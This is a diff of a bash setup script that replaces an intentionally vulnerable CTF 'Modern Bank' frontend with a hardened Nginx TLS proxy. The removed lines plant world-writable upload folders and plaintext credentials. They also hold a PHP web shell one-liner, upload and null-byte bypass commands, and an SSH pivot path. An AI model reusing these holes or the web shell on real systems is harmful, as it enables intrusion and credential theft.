@@ -1,35 +1,38 @@
 #!/bin/bash
 ##############################################################################
-# Modern Bank - Frontend Setup Script (Ubuntu LTS)
-# Usage: sudo ./setup_frontend.sh <BACKEND_IP>
-# 
-# This script:
-# - Installs Apache2 & PHP
-# - Configures PHP with necessary modules
-# - Deploys the banking application
-# - Sets up vulnerable upload directory
-# - Configures firewall rules
-# - Exposes credentials for CTF
+# Modern Bank - Secure Frontend Setup (Nginx "godproxy" TLS edge)
+# Usage: sudo ./setup_frontend.sh <BACKEND_IP> [INTERNAL_API_TOKEN]
 ##############################################################################
 
-set -e  # Exit on error
+set -euo pipefail
 
-# Color codes for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
-# Arguments
-BACKEND_IP="${1:-192.168.1.100}"
+BACKEND_IP="${1:-10.0.10.102}"
+INTERNAL_API_TOKEN="${2:-}"
+
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-APP_DIR="/var/www/html"
-LOG_FILE="/var/log/modern_bank_setup.log"
+APP_DIR="/var/www/modernbank-app"
+TLS_CERT_PATH="/etc/ssl/certs/modernbank-frontend.crt"
+TLS_KEY_PATH="/etc/ssl/private/modernbank-frontend.key"
+NGINX_SITE_PATH="/etc/nginx/sites-available/modernbank-godproxy.conf"
+LOG_FILE="/var/log/modern_bank_frontend_setup.log"
 
-# Log function
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${RED}[ERROR]${NC} Run this script as root." >&2
+    exit 1
+fi
+
 log() {
     echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')]${NC} $1" | tee -a "$LOG_FILE"
+}
+
+warn() {
+    echo -e "${YELLOW}[WARN]${NC} $1" | tee -a "$LOG_FILE"
 }
 
 error() {
@@ -38,313 +41,140 @@ error() {
 }
 
 success() {
-    echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$LOG_FILE"
+    echo -e "${GREEN}[OK]${NC} $1" | tee -a "$LOG_FILE"
 }
-
-warn() {
-    echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$LOG_FILE"
-}
-
-# Check if running as root
-if [[ $EUID -ne 0 ]]; then
-    error "This script must be run as root (use sudo)"
-fi
 
 trap 'error "Setup failed at line $LINENO while running: $BASH_COMMAND"' ERR
 
-log "Starting Modern Bank Frontend Setup..."
+if [[ -z "$INTERNAL_API_TOKEN" ]]; then
+    INTERNAL_API_TOKEN="$(openssl rand -hex 24)"
+    warn "No INTERNAL_API_TOKEN provided. Generated one automatically."
+    warn "Use the same token value for backend/setup_backend.sh argument #3."
+fi
+
+FRONTEND_IP="$(hostname -I | awk '{print $1}')"
+if [[ -z "$FRONTEND_IP" ]]; then
+    error "Unable to determine frontend IP from hostname -I"
+fi
+
+log "Starting secure frontend setup"
+log "Frontend IP: $FRONTEND_IP"
 log "Backend IP: $BACKEND_IP"
 
-# ============================================================================
-# 1. Update system and install dependencies
-# ============================================================================
-log "Updating system packages..."
+log "Installing dependencies"
 apt-get update -qq
 apt-get upgrade -y -qq
+apt-get install -y -qq nginx openssl curl ca-certificates ufw
 
-log "Installing Apache2, PHP, and required modules..."
-apt-get install -y -qq \
-    apache2 \
-    php-fpm \
-    php \
-    php-mysql \
-    php-curl \
-    php-json \
-    php-gd \
-    libapache2-mod-php \
-    curl \
-    wget \
-    git
-
-# ============================================================================
-# 2. Enable Apache2 modules
-# ============================================================================
-log "Configuring Apache2 modules..."
-PHP_APACHE_MOD="$(find /etc/apache2/mods-available -maxdepth 1 -type f -name 'php*.load' -printf '%f\n' 2>/dev/null | sed 's/\.load$//' | sort -Vr | head -n1)"
-if [[ -n "$PHP_APACHE_MOD" ]]; then
-    a2enmod "$PHP_APACHE_MOD" >/dev/null
-    log "Enabled Apache PHP module: $PHP_APACHE_MOD"
-else
-    warn "No php*.load Apache module found. Continuing with installed defaults."
-fi
-a2enmod rewrite >/dev/null
-a2enmod headers >/dev/null
-systemctl restart apache2
-
-# ============================================================================
-# 3. Clean web root and deploy application
-# ============================================================================
-log "Deploying application files..."
-rm -rf "$APP_DIR"/*
-
-# Copy app files
-if [ -d "$SCRIPT_DIR/www" ]; then
-    cp -a "$SCRIPT_DIR/www/." "$APP_DIR/"
-else
-    error "Application files not found in $SCRIPT_DIR/www"
-fi
-
-# ============================================================================
-# 4. Create uploads directory with VULNERABLE permissions
-# ============================================================================
-log "Setting up uploads directory (INTENTIONALLY VULNERABLE)..."
-UPLOAD_DIR="$APP_DIR/uploads"
-mkdir -p "$UPLOAD_DIR"
-
-# VULNERABILITY: Very permissive permissions allow PHP execution
-chmod 777 "$UPLOAD_DIR"
-chmod 777 "$APP_DIR"
-
-# ============================================================================
-# 5. Inject Backend IP into configuration
-# ============================================================================
-log "Configuring backend connectivity..."
-cat > "$APP_DIR/.env" << EOF
-BACKEND_IP=$BACKEND_IP
-BACKEND_PORT=8080
-BACKEND_SSH_USER=deploy
-BACKEND_SSH_PASS=DeployPass123!Vulnerable
-EOF
-
-# VULNERABILITY: .env file is web-accessible and readable
-chmod 644 "$APP_DIR/.env"
-
-# Also create a credentials file in uploads for easy discovery during CTF
-cat > "$UPLOAD_DIR/../credentials.txt" << EOF
-=== Modern Bank - Exposed Credentials ===
-Discovered: $(date)
-
-Backend SSH Access:
-- Server: $BACKEND_IP:22
-- Username: deploy
-- Password: DeployPass123!Vulnerable
-- Purpose: Internal API management
-
-Backend Admin CGI:
-- URL: http://$BACKEND_IP:8080/cgi-bin/admin.php
-- API Key: super_secret_api_key_12345
-
-Database Credentials:
-- Host: 192.168.1.50 (Windows Database Server)
-- User: bankapp
-- Pass: BankApp@2024!Insecure
-- Database: ModernBank
-
-Note: These credentials should be in a vault, but are exposed here for lab purposes.
-EOF
-
-chmod 644 "$APP_DIR/credentials.txt"
-
-# ============================================================================
-# 6. Configure PHP
-# ============================================================================
-log "Configuring PHP settings..."
-PHP_INI_UPDATED=false
-for PHP_CONF in /etc/php/*/apache2/php.ini; do
-    if [ -f "$PHP_CONF" ]; then
-        # Allow large file uploads (CTF requirement)
-        sed -i 's/^upload_max_filesize.*/upload_max_filesize = 50M/' "$PHP_CONF"
-        sed -i 's/^post_max_size.*/post_max_size = 50M/' "$PHP_CONF"
-        # Enable error reporting for debugging
-        sed -i 's/^display_errors.*/display_errors = On/' "$PHP_CONF"
-        log "Updated PHP config: $PHP_CONF"
-        PHP_INI_UPDATED=true
-    fi
-done
-
-if [[ "$PHP_INI_UPDATED" == false ]]; then
-    warn "No Apache PHP ini file found under /etc/php/*/apache2/php.ini"
-fi
-
-# ============================================================================
-# 7. Set correct ownership and permissions
-# ============================================================================
-log "Setting file permissions..."
+log "Deploying JavaScript frontend"
+rm -rf "$APP_DIR"
+mkdir -p "$APP_DIR"
+cp -a "$SCRIPT_DIR/app/." "$APP_DIR/"
 chown -R www-data:www-data "$APP_DIR"
 find "$APP_DIR" -type f -exec chmod 644 {} \;
 find "$APP_DIR" -type d -exec chmod 755 {} \;
 
-# Ensure uploads are writable but also executable (VULNERABLE!)
-chmod 777 "$APP_DIR/uploads"
+log "Generating TLS certificate for frontend edge"
+mkdir -p "$(dirname "$TLS_CERT_PATH")" "$(dirname "$TLS_KEY_PATH")"
+openssl req -x509 -nodes -newkey rsa:2048 -sha256 -days 825 \
+    -keyout "$TLS_KEY_PATH" \
+    -out "$TLS_CERT_PATH" \
+    -subj "/C=US/ST=Ontario/L=Toronto/O=Modern Bank/CN=modernbank-frontend" \
+    -addext "subjectAltName=IP:${FRONTEND_IP},IP:127.0.0.1,DNS:modernbank-frontend.local" \
+    >/dev/null 2>&1
 
-# ============================================================================
-# 8. Configure Apache VirtualHost
-# ============================================================================
-log "Configuring Apache VirtualHost..."
-cat > /etc/apache2/sites-available/000-default.conf << 'EOF'
-<VirtualHost *:80>
-    ServerAdmin admin@modernbank.local
-    DocumentRoot /var/www/html
+chmod 600 "$TLS_KEY_PATH"
+chmod 644 "$TLS_CERT_PATH"
 
-    <Directory /var/www/html>
-        Options Indexes FollowSymLinks
-        AllowOverride All
-        Require all granted
-    </Directory>
+log "Writing Nginx godproxy configuration"
+cat > "$NGINX_SITE_PATH" <<NGINXCONF
+limit_req_zone \$binary_remote_addr zone=api_limit:10m rate=15r/s;
 
-    # VULNERABILITY: Allow directory listings
-    <Directory /var/www/html/uploads>
-        Options Indexes FollowSymLinks
-        Require all granted
-    </Directory>
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    server_name _;
+    return 301 https://\$host\$request_uri;
+}
 
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-    CustomLog ${APACHE_LOG_DIR}/access.log combined
-</VirtualHost>
-EOF
+server {
+    listen 443 ssl http2 default_server;
+    listen [::]:443 ssl http2 default_server;
+    server_name _;
 
-a2ensite 000-default.conf 2>/dev/null || true
-systemctl reload apache2
+    ssl_certificate ${TLS_CERT_PATH};
+    ssl_certificate_key ${TLS_KEY_PATH};
+    ssl_protocols TLSv1.2 TLSv1.3;
+    ssl_prefer_server_ciphers on;
+    ssl_session_cache shared:SSL:10m;
+    ssl_session_timeout 10m;
 
-# ============================================================================
-# 9. Configure firewall rules
-# ============================================================================
-log "Configuring firewall rules..."
-ufw allow 22/tcp 2>/dev/null || true
-ufw allow 80/tcp 2>/dev/null || true
-ufw allow 443/tcp 2>/dev/null || true
-ufw --force enable 2>/dev/null || true
+    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
+    add_header X-Frame-Options "DENY" always;
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
 
-# ============================================================================
-# 10. Create CTF documentation file
-# ============================================================================
-log "Creating CTF documentation..."
-cat > "$APP_DIR/CTF_README.md" << EOF
-# Modern Bank - CTF Challenge Documentation
+    root ${APP_DIR};
+    index index.html;
 
-## Vulnerabilities in This Tier
+    location / {
+        try_files \$uri \$uri/ /index.html;
+    }
 
-### 1. Insecure File Upload (profile.php)
-- **Location:** /profile.php (Avatar Upload)
-- **Vulnerability:** Weak validation allows PHP shell upload
-  - Client-side validation only (can be bypassed)
-  - Extension whitelist bypassed with null bytes
-  - No MIME type checking on server
-  - File saved with execute permissions
-  - Predictable filename (user_id.jpg)
-  
-**Exploitation:**
-\`\`\`bash
-# Upload a PHP shell with .jpg extension
-curl -F "avatar=@shell.php.jpg" http://localhost/profile.php
-# Then access: http://localhost/uploads/1.jpg
-# Or use null byte: shell.php%00.jpg
-\`\`\`
+    location /api/ {
+        limit_req zone=api_limit burst=25 nodelay;
 
-### 2. Exposed Credentials
-- **Location:** /.env (accessible via web)
-- **Content:** Backend SSH credentials, API keys
-- **Discovery:** Browse to http://localhost/.env or check source code
+        proxy_pass https://${BACKEND_IP}:8443;
+        proxy_http_version 1.1;
+        proxy_ssl_server_name on;
+        proxy_ssl_verify off;
 
-- **Location:** /uploads/../credentials.txt
-- **Additional info:** Windows DB credentials, backend API endpoints
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto https;
+        proxy_set_header X-Internal-Token ${INTERNAL_API_TOKEN};
 
-### 3. Directory Traversal / File Disclosure
-- **.env file readable:** Database credentials exposed
-- **Directory listings enabled:** /uploads/ directory browsable
-- **Source code:** PHP files can be read (no obfuscation)
+        proxy_connect_timeout 5s;
+        proxy_read_timeout 60s;
+    }
+}
+NGINXCONF
 
-## Attack Path (Pivot to Backend)
+rm -f /etc/nginx/sites-enabled/default
+ln -sf "$NGINX_SITE_PATH" /etc/nginx/sites-enabled/modernbank-godproxy.conf
 
-1. Upload PHP web shell via avatar upload
-2. Access shell at /uploads/1.jpg (execute PHP)
-3. Find and read .env file
-4. Use SSH credentials to access Backend VM
-5. Continue pivoting to Windows Database tier
+nginx -t
+systemctl enable nginx
+systemctl restart nginx
 
-## Lab Architecture
+log "Configuring firewall"
+ufw allow 22/tcp >/dev/null 2>&1 || true
+ufw allow 80/tcp >/dev/null 2>&1 || true
+ufw allow 443/tcp >/dev/null 2>&1 || true
+ufw --force enable >/dev/null 2>&1 || true
 
-- **Tier 1 (This Machine):** Frontend - Ubuntu LTS, Apache2, PHP
-- **Tier 2 (Backend):** Ubuntu Server 24, Backend API, NodeJS/PHP CGI
-- **Tier 3 (Database):** Windows 10, SQL Server, Admin Services
+log "Running local validation checks"
+if curl -ks --max-time 5 "https://127.0.0.1/" | grep -q "Modern Bank"; then
+    success "Frontend UI is reachable over TLS"
+else
+    warn "Could not verify frontend HTML response locally"
+fi
 
-## Sample Attack Commands
+if curl -ks --max-time 5 "https://127.0.0.1/api/health" | grep -q '"status":"ok"'; then
+    success "Frontend-to-backend TLS proxy path is active"
+else
+    warn "API proxy health check did not return expected payload"
+fi
 
-\`\`\`bash
-# 1. Login and upload shell
-# Admin: admin/admin123
-# User: user/user123
-
-# 2. Create PHP shell
-echo '<?php system(\$_GET["cmd"]); ?>' > shell.php
-
-# 3. Upload as JPG
-mv shell.php shell.jpg
-
-# 4. Upload via profile.php
-# Then access via browser: http://localhost/uploads/1.jpg?cmd=id
-
-# 5. Read .env from shell
-# ?cmd=cat .env
-
-# 6. SSH to backend
-ssh deploy@BACKEND_IP
-# Password: DeployPass123!Vulnerable
-\`\`\`
-
-## Success Indicators
-
-- ✓ Upload PHP shell successfully
-- ✓ Execute system commands via web shell
-- ✓ Read .env file and extract credentials
-- ✓ SSH access to Backend VM
-EOF
-
-# ============================================================================
-# 11. Final status and cleanup
-# ============================================================================
-log "Restarting services..."
-systemctl restart apache2
-systemctl status apache2 --no-pager
-
-# ============================================================================
-# 12. Print summary
-# ============================================================================
 echo ""
-echo -e "${YELLOW}========================================${NC}"
-echo -e "${GREEN}Frontend Setup Complete!${NC}"
-echo -e "${YELLOW}========================================${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}Secure Frontend Setup Complete${NC}"
+echo -e "${GREEN}========================================${NC}"
 echo ""
-echo -e "Application URL: ${BLUE}http://localhost${NC}"
-echo -e "Backend IP: ${BLUE}$BACKEND_IP${NC}"
-echo -e "Application Dir: ${BLUE}$APP_DIR${NC}"
-echo -e "Log File: ${BLUE}$LOG_FILE${NC}"
+echo -e "Frontend URL: ${BLUE}https://${FRONTEND_IP}${NC}"
+echo -e "Backend target: ${BLUE}https://${BACKEND_IP}:8443${NC}"
+echo -e "Shared internal token: ${BLUE}${INTERNAL_API_TOKEN}${NC}"
 echo ""
-echo -e "${YELLOW}Demo Credentials:${NC}"
-echo -e "  Admin: ${BLUE}admin / admin123${NC}"
-echo -e "  User:  ${BLUE}user / user123${NC}"
-echo ""
-echo -e "${YELLOW}Vulnerabilities Enabled:${NC}"
-echo -e "  ✓ Insecure file upload (profile.php)"
-echo -e "  ✓ Exposed .env file with backend credentials"
-echo -e "  ✓ Exposed credentials.txt file"
-echo -e "  ✓ Directory testing. Allowed"
-echo -e "  ✓ PHP execution in uploads directory"
-echo ""
-echo -e "${YELLOW}CTF Attack Path:${NC}"
-echo -e "  1. Login (admin/admin123)"
-echo -e "  2. Upload PHP shell via avatar upload"
-echo -e "  3. Access shell at /uploads/1.jpg"
-echo -e "  4. Pivot using backend SSH credentials"
-echo ""
-success "Frontend tier is ready for exploitation!"
+
+success "Frontend tier is configured for encrypted-by-default traffic."
